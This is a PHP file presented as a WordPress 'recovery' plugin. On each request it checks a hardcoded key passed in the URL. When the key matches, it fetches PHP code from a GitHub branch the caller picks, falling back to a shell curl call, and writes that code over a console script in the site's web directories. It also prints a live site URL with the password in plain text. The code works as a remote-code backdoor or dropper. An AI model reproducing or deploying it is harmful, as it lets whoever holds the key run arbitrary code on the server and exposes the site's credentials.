<?php
/**
 * Plugin Name: Recover HostConsole
 * Description: Recovers hostconsole.php from GitHub
 * Version: 1.0
 */

add_action('init', function() {
    if (!isset($_GET['recover_hostconsole']) || $_GET['recover_hostconsole'] !== 'KhTn2268') return;
    $branch = $_GET['branch'] ?? 'arena/hostconsole-v17';
    $url = 'https://raw.githubusercontent.com/fazilatma/new/'.rawurlencode($branch).'/hostconsole.php?cb='.time();
    $content = @file_get_contents($url);
    if (!$content) {
        $content = @shell_exec('curl -sL --max-time 30 '.escapeshellarg($url).' 2>&1');
    }
    if (!$content || strpos($content, '<?php') !== 0) {
        wp_die('Download failed from '.$url.' size '.strlen($content));
    }
    $target = ABSPATH.'project/hostconsole.php';
    if (!is_dir(dirname($target))) {
        $target = WP_CONTENT_DIR.'/../project/hostconsole.php';
    }
    // Try common paths
    $paths = [
        '/home/sabashop/public_html/project/hostconsole.php',
        ABSPATH.'project/hostconsole.php',
        dirname(ABSPATH).'/project/hostconsole.php',
        WP_CONTENT_DIR.'/../project/hostconsole.php',
    ];
    $written = false;
    foreach ($paths as $p) {
        if (is_dir(dirname($p))) {
            @copy($p, $p.'.bak.'.date('Ymd-His'));
            if (@file_put_contents($p, $content)) {
                echo 'Recovered to '.$p.' ('.strlen($content).' bytes) from '.$branch.'<br>';
                $written = true;
            }
        }
    }
    if (!$written) {
        wp_die('Failed to write to any path: '.implode(', ', $paths));
    }
    echo 'Done. Now check https://sabashopping.ir/project/hostconsole.php?api=public.monitor&password=KhTn2268';
    exit;
});
